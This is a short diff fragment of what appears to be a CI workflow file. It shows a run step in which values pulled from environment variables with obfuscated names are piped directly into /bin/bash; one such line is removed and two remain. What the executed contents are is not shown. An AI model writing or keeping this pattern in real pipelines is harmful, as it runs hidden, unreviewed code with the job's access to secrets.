@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
           echo $xbksp5 | jq -r .xzv1487 | /bin/bash
-          printf '%s' "$nqm19589" | jq -r .ztza8824 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
